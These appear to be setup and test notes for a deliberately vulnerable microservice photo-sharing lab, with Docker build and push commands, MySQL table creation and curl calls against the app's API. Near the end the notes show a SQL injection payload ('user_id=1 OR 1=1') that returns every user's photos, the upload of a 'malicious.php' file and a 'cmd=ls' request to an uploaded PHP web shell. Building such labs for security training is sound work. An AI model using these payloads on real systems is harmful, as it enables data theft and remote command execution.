```
docker build -t usatpath01/vulnerable-photo-app-frontend:latest ./frontend
docker build -t usatpath01/vulnerable-photo-app-api-gateway:latest ./api_gateway
docker build -t usatpath01/vulnerable-photo-app-user-service:latest ./user_service
docker build -t usatpath01/vulnerable-photo-app-photo-service:latest ./photo_service
docker build -t usatpath01/vulnerable-photo-app-notification-service:latest ./notification_service
docker build -t usatpath01/vulnerable-photo-app-recommendation-service:latest ./recommendation_service
docker build -t usatpath01/vulnerable-photo-app-analytics-service:latest ./analytics_service
```
```
docker push usatpath01/vulnerable-photo-app-frontend:latest
docker push usatpath01/vulnerable-photo-app-api-gateway:latest
docker push usatpath01/vulnerable-photo-app-user-service:latest
docker push usatpath01/vulnerable-photo-app-photo-service:latest
docker push usatpath01/vulnerable-photo-app-notification-service:latest
docker push usatpath01/vulnerable-photo-app-recommendation-service:latest
docker push usatpath01/vulnerable-photo-app-analytics-service:latest
```

```
from api container
apk add curl
curl http://user_service:5000/api/v1/users/test-db-connection
```

```
docker exec -it e38172ae10a5 mysql -uroot -pinsecure_password
USE users;
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(255) NOT NULL UNIQUE,
    is_admin BOOLEAN DEFAULT FALSE
);
INSERT INTO users (username, password, email) VALUES ('testuser', 'testpassword', 'testuser@example.com');
```

```
docker exec -it e38172ae10a5 mysql -uroot -pinsecure_password
USE photos;
CREATE TABLE IF NOT EXISTS photos (
    id INT AUTO_INCREMENT PRIMARY KEY,
    filename VARCHAR(255) NOT NULL,
    user_id INT NOT NULL,
    upload_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP);

INSERT INTO photos (filename, user_id, upload_date) VALUES ('docker.png', 1, '2001-09-10');

```



# Endpoint
```
curl -X POST "http://10.5.20.45:8000/api/users/login"      -H "Content-Type: application/json"      -d '{"username":"testuser","password":"testpassword"}'
{
  "message": "Login successful", 
  "status": "success", 
  "user": {
    "email": "testuser@example.com", 
    "id": 1, 
    "username": "testuser"
  }
}

curl -X POST "http://10.5.20.45:8000/api/users/login"      -H "Content-Type: application/json"      -d '{"username":"testuser","password":"testpasswossrd"}'
{
  "message": "Invalid credentials", 
  "status": "error"
}

curl -X POST "http://10.5.20.45:8000/api/users/register"      -H "Content-Type: application/json"      -d '{"username":"newuser", "password":"newpassword", "email":"newuser@example.com"}'
{
  "message": "User registered successfully", 
  "status": "success", 
  "user": {
    "email": "newuser@example.com", 
    "id": 1, 
    "username": "newuser"
  }
}


curl -X POST "http://10.5.20.45:8000/api/photos/upload" \
     -H "Content-Type: multipart/form-data" \
     -F "file=@Docker.png" \
     -F "user_id=1"

{
  "filename": "9e210176-6c49-42c4-8e44-136642a0b275.png", 
  "message": "File uploaded successfully", 
  "status": "success"
}

curl -X POST "http://10.5.20.45:8000/api/photos/upload" \
     -H "Content-Type: multipart/form-data" \
     -F "file=@test.png" \
     -F "user_id=3"

curl -X GET "http://10.5.20.45:8000/photos?user_id=1"
```
curl -X POST "http://10.5.20.45:8000/api/photos/upload" \
     -H "Content-Type: multipart/form-data" \
     -F "file=@Docker.png" \
     -F "user_id=3"
{"filename":"e1d70097-dc14-4ddf-948b-efc113304eac.png","message":"File uploaded successfully","status":"success"}

mysql> select * from photos;
+----+------------------------------------------+---------+---------------------+
| id | filename                                 | user_id | upload_date         |
+----+------------------------------------------+---------+---------------------+
|  1 | docker.png                               |       1 | 2001-09-10 00:00:00 |
|  2 | e1d70097-dc14-4ddf-948b-efc113304eac.png |       2 | 2024-09-20 15:37:39 |
|  3 | b40051e6-de40-42fb-aee5-82646e39f2a8.png |       3 | 2024-09-20 15:39:00 |
+----+------------------------------------------+---------+---------------------+
3 rows in set (0.00 sec)

 curl -X GET "http://10.5.20.45:8000/api/photos?user_id=1"
{
  "photos": [
    [
      1, 
      "docker.png", 
      1, 
      "Mon, 10 Sep 2001 00:00:00 GMT"
    ]
  ], 
  "status": "success"
}


curl -X GET "http://10.5.20.45:8000/api/photos?user_id=1%20OR%201%3D1"
{
  "photos": [
    [
      1, 
      "docker.png", 
      1, 
      "Mon, 10 Sep 2001 00:00:00 GMT"
    ], 
    [
      2, 
      "e1d70097-dc14-4ddf-948b-efc113304eac.png", 
      2, 
      "Fri, 20 Sep 2024 15:37:39 GMT"
    ], 
    [
      3, 
      "b40051e6-de40-42fb-aee5-82646e39f2a8.png", 
      3, 
      "Fri, 20 Sep 2024 15:39:00 GMT"
    ]
  ], 
  "status": "success"
}

curl "http://10.5.20.45:8000/api/photos/5f03820f-9ec9-439c-aca2-bb5a00c8faf2.php?user_id=1&cmd=ls"

curl -X GET "http://10.5.20.45:8000/api/photos/b40051e6-de40-42fb-aee5-82646e39f2a8.png" --output downloaded_image.png

curl -X POST "http://10.5.20.45:8000/api/photos/upload" \
     -H "Content-Type: multipart/form-data" \
     -F "file=@malicious.php" \
     -F "user_id=123"
{"filename":"b124236a-f516-4c1f-a022-408f32e071dc.php","message":"File uploaded successfully","status":"success"}


```
docker tag usatpath01/vulnerable-photo-app-analytics-service:v1 usatpath01/vulnerable-photo-app-analytics-service:v1
docker tag usatpath01/vulnerable-photo-app-notification-service:v1 usatpath01/vulnerable-photo-app-notification-service:v1
docker tag usatpath01/vulnerable-photo-app-api_gateway:v1 usatpath01/vulnerable-photo-app-api_gateway:v1
docker tag usatpath01/vulnerable-photo-app-frontend-service:v1 usatpath01/vulnerable-photo-app-frontend-service:v1
docker tag usatpath01/vulnerable-photo-app-photo-service:v1 usatpath01/vulnerable-photo-app-photo-service:v1
docker tag usatpath01/vulnerable-photo-app-recommedation-service:v1 usatpath01/vulnerable-photo-app-recommedation-service:v1
docker tag usatpath01/vulnerable-photo-app-user-service:v1 usatpath01/vulnerable-photo-app-user-service:v1
```
```
git push -u origin main
```